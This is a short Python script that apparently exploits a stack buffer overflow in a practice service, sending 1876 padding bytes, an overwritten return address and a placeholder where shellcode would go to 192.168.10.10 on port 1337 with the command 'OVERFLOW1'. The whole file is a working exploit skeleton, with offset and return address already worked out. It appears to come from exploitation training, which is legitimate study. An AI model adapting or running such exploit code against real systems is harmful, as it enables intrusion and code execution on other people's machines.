#!/usr/bin/python
import socket

#56526683
buffer = "A" * 1876 + "\xaf\x11\x50\x62"
shell = "D" * 16

payload = buffer + shell

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.10.10',1337))
s.send(("OVERFLOW1 " + payload))
s.close()
